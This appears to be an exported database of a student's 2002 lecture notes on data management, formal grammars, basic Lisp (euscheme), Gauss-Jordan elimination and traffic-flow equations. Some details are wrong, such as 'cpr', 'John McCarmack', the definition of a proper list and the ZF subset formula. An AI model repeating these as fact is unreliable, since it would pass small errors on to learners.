&lt;dt&gt;Secure&lt;/dt&gt;
&lt;dd&gt;Data is a valuable resource and must be kept safe. Backups should also be made of valuable data.&lt;/dd&gt;
&lt;dt&gt;Accurate&lt;/dt&gt;
&lt;dd&gt;The information must be reliable and precise&lt;/dd&gt;
&lt;dt&gt;Timely&lt;/dt&gt;
&lt;dd&gt;The data must be current and up-to-date, especially if it is time sensitive&lt;/dd&gt;
&lt;dt&gt;Relevant&lt;/dt&gt;
&lt;dd&gt;The data must be appropriate to the decisions being made by the organisation&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;An organisations memory exists in many different places, including inobvious areas such as the organisations roles and culture. Successfully designing and applying a data management solution is therefore a highly complex wicked problem.&lt;/p&gt;

&lt;h4&gt;People&lt;/h4&gt;

&lt;p&gt;People are an essential part of an organisation's memory. The &lt;dfn&gt;organisational culture&lt;/dfn&gt; is the collection of beliefs, values and attitudes that affect the behaviour of organisation members. People establish &lt;dfn&gt;social networks&lt;/dfn&gt; of contacts, remembering who they can go to with specific problems or to access specific information. These networks are rarely documented. Knowledge of how to use organisational memory (who to ask about what, where to look things up) is called &lt;dfn&gt;metamemory&lt;/dfn&gt;, but is often referred to as &lt;em&gt;learning the ropes&lt;/em&gt;. &lt;dfn&gt;Standard operating procedures&lt;/dfn&gt; are also an important part of organisational memory as they help organisations remember how to perform routine activities.&lt;/p&gt;

&lt;h4&gt;Documents&lt;/h4&gt;

&lt;p&gt;Documents are a commn medium for storing organisational data, and can take many different forms such as memos, manuals and reports. &lt;dfn&gt;Hypertext&lt;/dfn&gt; allows the creation of non-linear documents which help readers find the information they are looking for more rapidly, but take longer to prepare.&lt;/p&gt;

&lt;h4&gt;Models&lt;/h4&gt;

&lt;p&gt;Organisations sometimes build mathematical models to describe their business, which can be placed in the broad category of &lt;acronym title=&quot;Decision support system&quot;&gt;DSS&lt;/acronym&gt; and used to aid the decision making process.&lt;/p&gt;

&lt;p&gt;Organisations often try to capture the knowledge of their employees in the form of rules and semantic nets stored in a &lt;dfn&gt;knowledge base&lt;/dfn&gt;, which is another type of organisational memory.&lt;/p&gt;

&lt;h4&gt;External memories&lt;/h4&gt;

&lt;p&gt;There are companies that provide access to information as a service to other organisations. This information adds to the &lt;dfn&gt;external memory&lt;/dfn&gt; of a company.&lt;/p&gt;

&lt;h4&gt;Problems with Data Management systems&lt;/h4&gt;

&lt;dl&gt;
&lt;dt&gt;Redundancy&lt;/dt&gt;
&lt;dd&gt;The same data can be stored in several different systems around an organisation. A classic example of this is a customer's address, which may end up stored in various customer related databases.&lt;/dd&gt;
&lt;dt&gt;Lack of data control&lt;/dt&gt;
&lt;dd&gt;Poor management of data, usually because different data is managed by different departments with little consistency across a large organisation.&lt;/dd&gt;
&lt;dt&gt;Poor interface&lt;/dt&gt;
&lt;dd&gt;Poor interfaces to data management systems can make the data virtually useless to the people who need to access it.&lt;/dd&gt;
&lt;dt&gt;Delays&lt;/dt&gt;
&lt;dd&gt;Decision makers need fast access to the data they need. Poorly designed data management systems can lead to delays.&lt;/dd&gt;
&lt;dt&gt;Lack of reality&lt;/dt&gt;
&lt;dd&gt;The data stored by an organisation must be relevant to the real world. Often systems will not store or provide access to the information needed by decision makers.&lt;/dd&gt;
&lt;dt&gt;Lack of data integration&lt;/dt&gt;
&lt;dd&gt;Data is frequently spread across many systems in an organisation. Integrating it is a long and complex process, best handled in an incremental manner as new systems are developed.&lt;/dd&gt;
&lt;/dl&gt;

&lt;h4&gt;A brief history of Data Management&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;1950s - file systems&lt;/li&gt;
&lt;li&gt;1960s - Hierarchical DBMS&lt;/li&gt;
&lt;li&gt;1970s - Network DBMS, followed by Relational DBMS&lt;/li&gt;
&lt;li&gt;1990s - Object-oriented DBMS&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;Data, information and knowledge&lt;/h4&gt;

&lt;dl&gt;
&lt;dt&gt;Data&lt;/dt&gt;
&lt;dd&gt;Raw, unsummarised and unanalyzed facts. Data is of very little use to decision makers as it contains far too much detail. Before it can be used it must be converted in to information.&lt;/dd&gt;
&lt;dt&gt;Information&lt;/dt&gt;
&lt;dd&gt;Data that has been processed in to a meaningful form.&lt;/dd&gt;
&lt;dt&gt;Knowledge&lt;/dt&gt;
&lt;dd&gt;The capacity to use information - requires education and experience.&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;One person's information can be another person's data, depending on the level of detail required. We finish with some atrocious ASCII-art.&lt;/p&gt;

&lt;pre&gt;
             |-----------|\
             | Knowledge | \ Interpretation
 |------|    |-----------|  \
 | Data |\        |          &lt;span style=&quot;text-decoration: underline;&quot;&gt;\&lt;/span&gt;||----------|
 |------| \       | Request    | Decision |
           \      |          _ |----------|
Conversion  &lt;span style=&quot;text-decoration: underline;&quot;&gt;\&lt;/span&gt;|   \|/         /|
           |-------------|  /
           | Information | / Interpretation
           |-------------|/
&lt;/pre&gt;</field>
		<field name="created">2002-09-30 14:47:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">463</field>
		<field name="title">Languages and grammars</field>
		<field name="slug">languagesAndGrammars</field>
		<field name="body">&lt;h3&gt;Languages and Grammars&lt;/h3&gt;

&lt;p&gt;These notes are from a lecture on the 26th September.&lt;/p&gt;

&lt;p&gt;Let P be a Σ rewriting system.&lt;/p&gt;

&lt;p&gt;A word ω is &lt;dfn&gt;terminal&lt;/dfn&gt; in P if there is no word Z so that ω =&amp;gt;&lt;sub&gt;P&lt;/sub&gt; Z&lt;/p&gt;

&lt;p&gt;A &lt;dfn&gt;grammar&lt;/dfn&gt; is a Σ rewriting system P together with an initial string I: &lt;span class=&quot;equation&quot;&gt;G = (P, I)&lt;/span&gt;. The grammar defines all possible words in the language. To generate the language you start with the initial string and apply the rules of the Σ rewriting system in as many ways as possible.&lt;/p&gt;

&lt;p&gt;The grammar generates the language:&lt;/p&gt;

&lt;p&gt;L&lt;sub&gt;G&lt;/sub&gt; = { ω: I =&amp;gt;*&lt;sub&gt;P&lt;/sub&gt; ω, ω is terminal }&lt;/p&gt;

&lt;p&gt;So only terminal words are included in the language. A &lt;dfn&gt;formal language&lt;/dfn&gt; is one generated in this way.&lt;/p&gt;

&lt;h4&gt;Notation&lt;/h4&gt;

&lt;pre&gt;
α ~&amp;gt; β&lt;sub&gt;1&lt;/sub&gt;
α ~&amp;gt; β&lt;sub&gt;2&lt;/sub&gt; can be rewritten as α ~&amp;gt; β&lt;sub&gt;1&lt;/sub&gt; | β&lt;sub&gt;2&lt;/sub&gt; | β&lt;sub&gt;3&lt;/sub&gt;
α ~&amp;gt; β&lt;sub&gt;3&lt;/sub&gt;
&lt;/pre&gt;

&lt;h4&gt;Example 1&lt;/h4&gt;

&lt;pre&gt;
Σ = { a, b, X }
P = { X ~&amp;gt; ab | aXb }
I = X (initial string)
G = (P, X)

Typical Derivation:

X
aXb
aaXbb
terminal: aaabbb ∈ L&lt;sub&gt;G&lt;/sub&gt;
&lt;/pre&gt;

&lt;p&gt;In this language, any words that do not contain an X are terminal:&lt;/p&gt;

&lt;p&gt;Terminal in P = {a, b}*&lt;/p&gt;

&lt;p&gt;L&lt;sub&gt;G&lt;/sub&gt; = { a&lt;sup&gt;n&lt;/sup&gt;b&lt;sup&gt;n&lt;/sup&gt;: n = 1, 2, 3, 4, ... }&lt;/p&gt;

&lt;h4&gt;Example 2&lt;/h4&gt;

&lt;pre&gt;
Σ = { S, X, Y, +, *, 0, 1, ), ( }
P = { S ~&amp;gt; (S + S) | (S * S) | 0 | 1 | X | Y }
G = (P, S) so S is the initial string

Typical Derivation:

      S
   (S + S)
((S * S) + S) =&amp;gt;* ((X * Y) + X)
&lt;/pre&gt;

&lt;p&gt;Note that we do not make any assumptions about the &lt;em&gt;meanings&lt;/em&gt; of 0, 1, + and * - as far as we are concerned they are just symbols.&lt;/p&gt;

&lt;p&gt;The language described above contains all of the expressions that can be built up using addition and multiplication of X, Y, 0 and 1. For example, (((X * Y) + (Y * X)) * X) can be formed with:&lt;/p&gt;

&lt;pre&gt;
      S
   (S * S)
((S + S) * S) =&amp;gt;* (((S * S) + (S + S)) * S) =&amp;gt;* (((X * Y) + (Y * X)) * X)
&lt;/pre&gt;

&lt;h4&gt;Applications&lt;/h4&gt;

&lt;p&gt;Grammars give a succinct and unambiguous description of a language. Programming languages are described by grammars. For something like C this would seem like an almost impossible task but can be achieved by building grammars for simple things such as allowed variable names and C expressions and then moving up to conditional statements, function declarations and eventually whole programs. This takes advantage of the fact that grammars can be used as building blocks in the same way as C macros.&lt;/p&gt;

&lt;p&gt;We need to be able to do the following:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Given a simple grammar G, find the language L&lt;sub&gt;G&lt;/sub&gt;&lt;/li&gt;
&lt;li&gt;Given a simple language (or example), find a grammar for it&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;Example: Abducted by Aliens&lt;/h4&gt;

&lt;p&gt;You have been abducted by aliens. You regain consciousness on their ship, and they speak to you in the followign manner:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Alien 1&lt;/em&gt;: dee paa da wee pam&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Alien 2&lt;/em&gt;: dee wap paa da wee pam&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Alien 3&lt;/em&gt;: dee wee wap paa da wee pam&lt;/p&gt;

&lt;p&gt;What do you say? Let's work out the grammar for their language (from what little we've seen of it).&lt;/p&gt;

&lt;p&gt;Σ = { da, dee, paa, wee, pam, wap, X, Y, Z }&lt;/p&gt;

&lt;p&gt;We've added some extra terms X, Y and Z to help us construct the grammar as the symbols we already have are terminal. Looking at the alien's speech so far everything starts with &quot;dee&quot; and ends with &quot;paa da wee pam&quot;. We will use X as our intial string. Remember that (0) is the empty string.&lt;/p&gt;

&lt;pre&gt;
X ~&amp;gt; dee Y paa da wee pam
Y ~&amp;gt; (0) | wap | Z
Z ~&amp;gt; wee wap | wee wap Z
&lt;/pre&gt;

&lt;p&gt;From the above, we can try &quot;dee wee wap wee wap paa da wee pam&quot; and see what happens.&lt;/p&gt;

&lt;h4&gt;Zermelo Fraenkel Set Theory&lt;/h4&gt;

&lt;p&gt;L&lt;sub&gt;ZF&lt;/sub&gt; (&lt;dfn&gt;Zermelo Fraenkel Set Theory&lt;/dfn&gt;) is a grammar that can be used to represent almost all of contemporary mathematics in very precise (if lengthy) terms.&lt;/p&gt;

&lt;pre&gt;
S ~&amp;gt; (S ^ S) | (S v S) | (&amp;gt; S) | (S -&amp;gt; S) | (S ⇔ S)
   | (∀ V ) S | (∃ V) S | V = V | V ∈ V
V ~&amp;gt; variable (sequence of letters and digits)
&lt;/pre&gt;

&lt;p&gt;Some examples:&lt;/p&gt;

&lt;pre&gt;
A = B ∪ C in L&lt;sub&gt;ZF&lt;/sub&gt; is (∀ X)(X ∈ A ⇔ (X ∈ B v X ∈ C))
A = {B, C} in L&lt;sub&gt;ZF&lt;/sub&gt; is (∀ X)(X ∈ A ⇔ (X = B v X = C))
A ⊆ B in L&lt;sub&gt;ZF&lt;/sub&gt; is (∀ X)(X ∈ A ⇔ X ∈ B)
&lt;/pre&gt;</field>
		<field name="created">2002-09-30 15:26:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">464</field>
		<field name="title">Basic Lisp</field>
		<field name="slug">basicLisp</field>
		<field name="body">&lt;h3&gt;Basic Lisp&lt;/h3&gt;

&lt;p&gt;Typically, Lisp is run as an interactive interpreter. People write a whole load of Lisp in a test file and then load it in to the interpreter and try it out to see if it works. Lisp is a very dynamic language - functions can be redefined on the fly and it is perfectly possible to shoot yourself in the foot (by redefining Lisp internals for example) if you really want to.&lt;/p&gt;

&lt;p&gt;To load a file full of pre-written Lisp code, use &lt;code&gt;(load &quot;filename.ext&quot;)&lt;/code&gt;, which is the equivalent of typing in all of the lines from the file at the interactive prompt. Files can be edited and reloaded simply by re-calling the load function.&lt;/p&gt;

&lt;p&gt;Reminder: In Lisp, all functions are called using &lt;code&gt;(func arg1 arg2 ...)&lt;/code&gt; syntax. Language such as C and Java provide two ways of calling functions - &lt;code&gt;function(arg, arg, ...)&lt;/code&gt; and infix notation such as &lt;code&gt;arg + arg&lt;/code&gt; (the plus sign is really a call to an addition function). Infix notation is quicker to understand initially as it duplicates the way maths is taught at school but it is far more limited than argument notation as it can only ever deal with two arguments. Lisp only has the more powerful multiple arguments method of calling functions.&lt;/p&gt;

&lt;h4&gt;EuLisp and euscheme&lt;/h4&gt;

&lt;p&gt;We will be using Eulisp on the course, which was partially developed by professors at the University of Bath who have also written an implementation of the language (covered by a BSD style language and available from &lt;a href=&quot;http://www.cs.bath.ac.uk/~jap/EuLisp/eulisp.html&quot; title=&quot;EuLisp FAQ&quot;&gt;here&lt;/a&gt;). The easiest implementation to use for educational purposes is called &lt;dfn&gt;euscheme&lt;/dfn&gt;, which despite the thoroughly confusing name is a Lisp interpreter and not a Scheme interpreter. It can be run on the University unix machines by typing &lt;code&gt;euscheme&lt;/code&gt;, and exited by hitting &lt;kbd&gt;Ctrl+D&lt;/kbd&gt; (sometimes several times if the interpreter is currently in a debug loop).&lt;/p&gt;

&lt;p&gt;The language euscheme is written partly in C and partly in euscheme itself. It has a C kernel which handles basic things such as memory management, garbage collection and low level functions such as addition. The rest of the interpreter is written in Lisp.&lt;/p&gt;

&lt;p&gt;When you are typing things in to the euscheme interpreter you are actually interacting with a Lisp function called &lt;code&gt;read-eval-print&lt;/code&gt;. The debug loop (described below) is itself a recursive call to this interactive function.&lt;/p&gt;

&lt;h4&gt;Debugging&lt;/h4&gt;

&lt;p&gt;In euscheme, errors in interpreted code will plunge you in to a debug loop complete with a debug prompt. The debug loop provides additional functionality - type &lt;kbd&gt;help:&lt;/kbd&gt; at the debug prompt for a list of debug options. The most important debug command is &lt;kbd&gt;bt:&lt;/kbd&gt; (&lt;dfn&gt;backtrace&lt;/dfn&gt;) which lists all of the functions that have been called to get to the current state of the interpreter. This can be invaluable for debugging large programs. Another useful command is &lt;kbd&gt;top:&lt;/kbd&gt; which will instantly snap you out of the debug loops and take you back to the standard prompt.&lt;/p&gt;

&lt;h4&gt;length&lt;/h4&gt;

&lt;p&gt;The &lt;code&gt;length&lt;/code&gt; function returns the length of a list:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (length '(1 2 3))
3
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The single quote is important, as without it Lisp would attempt to interpret the symbol 1 as a function which would cause an error.&lt;/p&gt;

&lt;p&gt;Note: Entering &lt;code&gt;length '(1 2 3)&lt;/code&gt; without the outer brackets will result in the interpreter evaluating the command as two separate expressions.&lt;/p&gt;

&lt;h4&gt;Data Structures and Lists&lt;/h4&gt;

&lt;p&gt;In Lisp, the only built in data structure is the &lt;dfn&gt;list&lt;/dfn&gt;. Lists are very flexible and can be used to define a whole variety of more complex structures through nesting lists - for example:&lt;/p&gt;

&lt;pre&gt;
(x x x x) - a list
(x x) - a pair
(x (x x)) - a nested list
&lt;/pre&gt;

&lt;p&gt;There are three principle operations that can be performed on a list:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Return the first thing in the list&lt;/li&gt;
&lt;li&gt;Return the remaining things in the list&lt;/li&gt;
&lt;li&gt;Add an item to a list to make a new, longer list&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1 and 2 are accessors. 3 is a constructor. The lisp functions that accomplish these operations are called, respectively, &lt;code&gt;car&lt;/code&gt;, &lt;code&gt;cpr&lt;/code&gt; and &lt;code&gt;cons&lt;/code&gt;. These functions take their names from the registers of the &lt;acronym title=&quot;International Business Machines&quot;&gt;IBM&lt;/acronym&gt; 704 computer, which was used by John McCarmack to write one of the first Lisp implementations.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;car&lt;/code&gt; = first, &lt;code&gt;cdr&lt;/code&gt; = rest and &lt;code&gt;cons&lt;/code&gt; is the constructor.&lt;/p&gt;

&lt;pre&gt;
(car '(a b c)) returns a
(cdr '(a b c)) returns (b c)
(cons 'a '(b c) returns (a b c)
&lt;/pre&gt;

&lt;p&gt;So, if x is a list, &lt;code&gt;(cons (car x) (cdr x)) == x&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you try to run &lt;code&gt;car&lt;/code&gt; or &lt;code&gt;cdr&lt;/code&gt; on something that is not a list you will get an error. &lt;code&gt;(car ())&lt;/code&gt; is the source of much debate in the Lisp world - in euscheme it will raise an error, but in some Lisp implementations it will return an empty list.&lt;/p&gt;

&lt;p&gt;Jargon: A &lt;dfn&gt;proper list&lt;/dfn&gt; is a list that is not empty.&lt;/p&gt;

&lt;p&gt;In theory, you can build lists by repeatedly calling the &lt;code&gt;cons&lt;/code&gt; function. In practise, Lisp provides a much more convenient method in the form of the &lt;code&gt;list&lt;/code&gt; function:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (list 1 4 66)
(1 4 66)
&amp;gt;
&lt;/pre&gt;

&lt;h4&gt;Some interesting Lisp function results&lt;/h4&gt;

&lt;pre&gt;
&amp;gt; (*)
1
&amp;gt; ''two
(quote two)
&amp;gt; (cons () ())
(())
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Finally, note the difference between &lt;code&gt;'(a b c)&lt;/code&gt; and &lt;code&gt;(list a b c)&lt;/code&gt; - while the quote method returns the list exactly as written, the list function will attempt to evaluate each argument before returning.&lt;/p&gt;</field>
		<field name="created">2002-09-30 16:01:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">465</field>
		<field name="title">Gauss Jordan Elimination</field>
		<field name="slug">gaussJordanElimination</field>
		<field name="body">&lt;h3&gt;Gauss-Jordan Elimination&lt;/h3&gt;

&lt;p&gt;The steps of the Gauss-Jordan elimination process are as follows:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Input augmented matrix A&lt;/li&gt;
&lt;li&gt;Get the reduced echelon form for A using elementary row operations. This is done by first creating leading 1s, then ensuring that columns containing leading 1s have only 0s above and below the leading 1, column by column starting with the first column.&lt;/li&gt;
&lt;li&gt;The matrix in reduced echelon form will either give the solution or demonstrate that there is no solution.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Two matrices A and B are &lt;dfn&gt;row equivalent&lt;/dfn&gt; if A =&amp;gt;* B by elementary row operations. During the process of Gauss-Jordan elimination all matrices are row equivalent to the original and each other.&lt;/p&gt;

&lt;h4&gt;Example&lt;/h4&gt;

&lt;pre&gt;
 x&lt;sub&gt;1&lt;/sub&gt; + 2x&lt;sub&gt;2&lt;/sub&gt; + x&lt;sub&gt;3&lt;/sub&gt; =  1
2x&lt;sub&gt;1&lt;/sub&gt; + 4x&lt;sub&gt;2&lt;/sub&gt; - x&lt;sub&gt;3&lt;/sub&gt; = -1

[ 1   2   1   1 ]    [ 1   2   1   1 ]
[ 2   4  -1  -1 ] =&amp;gt; [ 0   0  -3  -3 ] R&lt;sub&gt;2&lt;/sub&gt; := R&lt;sub&gt;2&lt;/sub&gt; - 2R&lt;sub&gt;1&lt;/sub&gt;

[ 1   2   1   1 ]
[ 0   0   1   1 ] R&lt;sub&gt;2&lt;/sub&gt; := R&lt;sub&gt;2&lt;/sub&gt; / -3

To fix column 3:

[ 1   2   0   0 ] R&lt;sub&gt;1&lt;/sub&gt; := R&lt;sub&gt;1&lt;/sub&gt; - R&lt;sub&gt;2&lt;/sub&gt;
[ 0   0   1   1 ] (this is in reduced echelon form)

So...

x&lt;sub&gt;1&lt;/sub&gt; = -2x&lt;sub&gt;2&lt;/sub&gt;
x&lt;sub&gt;2&lt;/sub&gt; = anything
x&lt;sub&gt;3&lt;/sub&gt; = 1

The system has many solutions.
&lt;/pre&gt;

&lt;p&gt;In general, any columns without a leading one of them correspond to a variable that can be any value.&lt;/p&gt;

&lt;p&gt;The difficult part of Gauss-Jordan elimination is the bit in the middle - deciding which columns to manipulate and how to convert them in to leading 1s. Consider a matrix A&lt;sub&gt;n x m&lt;/sub&gt; in the middle of the computation. Some number i&lt;sub&gt;l&lt;/sub&gt; of rows have leading 1s in them and some number j of columns have been processed. j ≥ i&lt;sub&gt;l&lt;/sub&gt;&lt;/p&gt;

&lt;pre&gt;
    [ a&lt;sub&gt;1&lt;/sub&gt; ... a&lt;sub&gt;1m&lt;/sub&gt;   b&lt;sub&gt;1&lt;/sub&gt; ]
A = [ ...            ]
    [ a&lt;sub&gt;n&lt;/sub&gt; ... a&lt;sub&gt;nm&lt;/sub&gt;   b&lt;sub&gt;n&lt;/sub&gt; ]

The matrix now looks like this:

                               j
   0   0  ...  0   1   0  ...  0  ...  
    ...
i&lt;sub&gt;l&lt;/sub&gt; 0   0  ...  0   0   0  ...  1  ...
    ...
   0   0  ...  0   0   0  ...
&lt;/pre&gt;

&lt;p&gt;Next step: Increment j. Look in column j for a&lt;sub&gt;oj&lt;/sub&gt; ≠ 0, with i &amp;gt; i&lt;sub&gt;l&lt;/sub&gt; - now interchange row i and row i&lt;sub&gt;l&lt;/sub&gt; + 1 (if nothing found, move on to next columns. Create a leading 1, then reduce column j.&lt;/p&gt;

&lt;h4&gt;Pseudo code for Gauss-Jordan elimination&lt;/h4&gt;

&lt;pre&gt;
i&lt;sub&gt;l&lt;/sub&gt; = 0 (number of leading 1s created)
for j = 1 ... m do:
    if ∃ i &amp;gt; i&lt;sub&gt;l&lt;/sub&gt; such that a&lt;sub&gt;ij&lt;/sub&gt; ≠ 0 then:
        i&lt;sub&gt;l&lt;/sub&gt; = i&lt;sub&gt;l&lt;/sub&gt; + 1
        interchange row i and row i&lt;sub&gt;l&lt;/sub&gt; (this brings the new row
          just below the row you have just done)
        divide row i by a&lt;sub&gt;i&lt;sub&gt;l&lt;/sub&gt;j&lt;/sub&gt; creating a leading 1
        Reduce all other entries in the column to 0
&lt;/pre&gt;

&lt;h4&gt;Complexity&lt;/h4&gt;

&lt;p&gt;Suppose A is n x m. We can measure complexity by the number of +, -, *, / operations that are carried out. To do this we look at the pseudo code. If we run the main loop m times:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The interchange operation takes 2m operations&lt;/li&gt;
&lt;li&gt;Dividing row i by a&lt;sub&gt;i&lt;sub&gt;l&lt;/sub&gt;j&lt;/sub&gt; takes m-j operations&lt;/li&gt;
&lt;li&gt;The reduce other entries bit takes nm operations&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So the complexity of the operation is O(mnm) or O(nm&lt;sup&gt;2&lt;/sup&gt;)&lt;/p&gt;

&lt;h4&gt;Additional Resources&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Wikipedia has an &lt;a href=&quot;http://www.wikipedia.org/wiki/Gauss-Jordan_elimination&quot; title=&quot;Wikipedia: Gauss-Jordan elimination&quot;&gt;excellent explanation&lt;/a&gt; of Gauss-Jordan Elimination&lt;/li&gt;
&lt;li&gt;The &lt;a href=&quot;http://www.math.harvard.edu/computing/javascript/GaussJordan/&quot;&gt;Gauss-Jordan elimination game&lt;/a&gt; is a javascript puzzle&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.aspire.cs.uah.edu/textbook/gauss.html&quot; title=&quot;Gauss-Jordan Elimination&quot;&gt;This page&lt;/a&gt; explains the Gauss-Jordan algorithm in a bit more depth&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Homogeneous Systems&lt;/h3&gt;

&lt;p&gt;A system of linera equations is &lt;dfn&gt;homogeneous&lt;/dfn&gt; if all of the constant terms are 0. For example:&lt;/p&gt;

&lt;pre&gt;
3x&lt;sub&gt;1&lt;/sub&gt; + 2x&lt;sub&gt;2&lt;/sub&gt; = 0
 x&lt;sub&gt;1&lt;/sub&gt; -  x&lt;sub&gt;2&lt;/sub&gt; = 0
&lt;/pre&gt;

&lt;p&gt;A homogeneous system in n variables &lt;em&gt;always&lt;/em&gt; has the trivial solution x&lt;sub&gt;1&lt;/sub&gt; = x&lt;sub&gt;2&lt;/sub&gt; = ... = 0 - so there is no chance that the system will have no solutions, reducing the possible outcomes from three to two.&lt;/p&gt;

&lt;h4&gt;Theorem&lt;/h4&gt;

&lt;p&gt;A homogeneous system with more unknowns than equations always has many solutions&lt;/p&gt;

&lt;h4&gt;Proof&lt;/h4&gt;

&lt;p&gt;Suppose the system has n equations with m unknowns, and m &amp;gt; n.&lt;/p&gt;

&lt;p&gt;Let A = the augmented matrix&lt;/p&gt;

&lt;p&gt;Find R = reduced echelon form of A using Gauss-Jordan elimination.&lt;/p&gt;

&lt;pre&gt;
         m
  1 . . . . . . .
  0 1 . . . . . .
n 0 0 1 . . . . .
  0 0 0 1 . . . .
  0 0 0 0 1 . . .
&lt;/pre&gt;

&lt;p&gt;R has ≤ n leading 1s, so at least m-n of the variables can take &lt;em&gt;any&lt;/em&gt; value. This shows that there are many solutions.&lt;/p&gt;

&lt;h4&gt;Example&lt;/h4&gt;

&lt;pre&gt;
x&lt;sub&gt;1&lt;/sub&gt; + 2x&lt;sub&gt;2&lt;/sub&gt; + x&lt;sub&gt;3&lt;/sub&gt; = 0
      x&lt;sub&gt;2&lt;/sub&gt; - x&lt;sub&gt;3&lt;/sub&gt; = 0
&lt;/pre&gt;

&lt;p&gt;This is the intersection of two planes through the origin in 3D space.&lt;/p&gt;

&lt;h4&gt;Matrix notation for a system of equations&lt;/h4&gt;

&lt;pre&gt;
[ a&lt;sub&gt;11&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt; + ... + a&lt;sub&gt;1m&lt;/sub&gt;x&lt;sub&gt;m&lt;/sub&gt; = b&lt;sub&gt;1&lt;/sub&gt; ]
[  ...                   ] can be written as AX = B
[ a&lt;sub&gt;n1&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt; + ... + a&lt;sub&gt;nm&lt;/sub&gt;x&lt;sub&gt;m&lt;/sub&gt; = b&lt;sub&gt;n&lt;/sub&gt; ]

    [ a&lt;sub&gt;1 &lt;/sub&gt; ... a&lt;sub&gt;1m&lt;/sub&gt; ]
A = [  ...       ]
    [ a&lt;sub&gt;n1&lt;/sub&gt; ... a&lt;sub&gt;nm&lt;/sub&gt; ]

    [ x&lt;sub&gt;1&lt;/sub&gt; ]      [ b&lt;sub&gt;1&lt;/sub&gt; ]
X = [ .&lt;sub&gt; &lt;/sub&gt; ]  B = [  &lt;sub&gt; &lt;/sub&gt; ]
    [ x&lt;sub&gt;n&lt;/sub&gt; ]      [ b&lt;sub&gt;n&lt;/sub&gt; ]
&lt;/pre&gt;</field>
		<field name="created">2002-10-01 12:06:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">466</field>
		<field name="title">Applications</field>
		<field name="slug">applications</field>
		<field name="body">&lt;h3&gt;Applications&lt;/h3&gt;

&lt;h4&gt;Example 1: Traffic Flow&lt;/h4&gt;

&lt;pre&gt;
                         20
                _ B &amp;lt;---------
                /| \
           x&lt;sub&gt;1&lt;/sub&gt;  /    \ x&lt;sub&gt;2&lt;/sub&gt;
   10         /      \|     70
----------&amp;gt; A          C --------&amp;gt;
             |\       /
           x&lt;sub&gt;4&lt;/sub&gt;  \     / x&lt;sub&gt;3&lt;/sub&gt;
                \  |/
                  D
                  ^
                  |
                  | 40
&lt;/pre&gt;

&lt;p&gt;The above (badly drawn) ASCII diagram shows a traffic system. Traffic flows from A to B to C to D and back to A again, with new items flowing in to A, B and D at 10, 20 and 40 items per timeunit respectively. Items flow out of the system at point C at the rate of 70 items per timeunit. We assume that the flow in to each of the nodes on the system is equal to the flow out of that node.&lt;/p&gt;

&lt;p&gt;This gives rise to the following equations, which can then be rearranged to form a matrix:&lt;/p&gt;

&lt;pre&gt;
A: 10 + x&lt;sub&gt;4&lt;/sub&gt; - x&lt;sub&gt;1&lt;/sub&gt; = 0
B: x&lt;sub&gt;1&lt;/sub&gt; + 20 - x&lt;sub&gt;2&lt;/sub&gt; = 0
C: x&lt;sub&gt;2&lt;/sub&gt; - 70 - x&lt;sub&gt;3&lt;/sub&gt; = 0
D: x&lt;sub&gt;3&lt;/sub&gt; + 40 - x&lt;sub&gt;4&lt;/sub&gt; = 0

[ -1   0   0   1  -10 ]
[  1  -1   0   0  -20 ]
[  0   1  -1   0   70 ]
[  0   0   1  -1  -40 ]
&lt;/pre&gt;

&lt;p&gt;We can now use Gauss-Jordan elimination to reduce the above matrix to reduced echelon form and read off the results:&lt;/p&gt;

&lt;pre&gt;
[ 1   0   0  -1   10 ]  x&lt;sub&gt;1&lt;/sub&gt; = x&lt;sub&gt;4&lt;/sub&gt; + 10
[ 0   1   0  -1   30 ]  x&lt;sub&gt;2&lt;/sub&gt; = x&lt;sub&gt;4&lt;/sub&gt; + 30
[ 0   0   1  -1  -40 ]  x&lt;sub&gt;3&lt;/sub&gt; = x&lt;sub&gt;4&lt;/sub&gt; - 40
[ 0   0   0   0    0 ]  x&lt;sub&gt;4&lt;/sub&gt; = anything
&lt;/pre&gt;

&lt;p&gt;Note that while x&lt;sub&gt;4&lt;/sub&gt; can be anything, if we take the one way system in the original diagram in to account we must add an additional constraint stating x&lt;sub&gt;4&lt;/sub&gt; ≥ 40&lt;/p&gt;

&lt;h4&gt;Example 2: Curve Fitting&lt;/h4&gt;

&lt;p&gt;This will be part of our first piece of Maple coursework.&lt;/p&gt;

&lt;p&gt;A polynomial in x of degree n is an expression of the form:&lt;/p&gt;

&lt;pre&gt;
P(x) = a&lt;sub&gt;0&lt;/sub&gt; + a&lt;sub&gt;1&lt;/sub&gt;x + a&lt;sub&gt;2&lt;/sub&gt;x&lt;sup&gt;2&lt;/sup&gt; + ... + a&lt;sub&gt;n&lt;/sub&gt;x&lt;sup&gt;n&lt;/sup&gt; with a ≠ 0
&lt;/pre&gt;

